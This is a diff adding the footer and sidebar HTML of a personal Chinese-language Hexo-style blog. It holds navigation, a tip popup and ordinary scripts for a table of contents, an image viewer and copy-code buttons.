+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/my.png" alt="lzeroyuee&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/my.png">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/my.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+  </div>
+</body>
+
+</html>
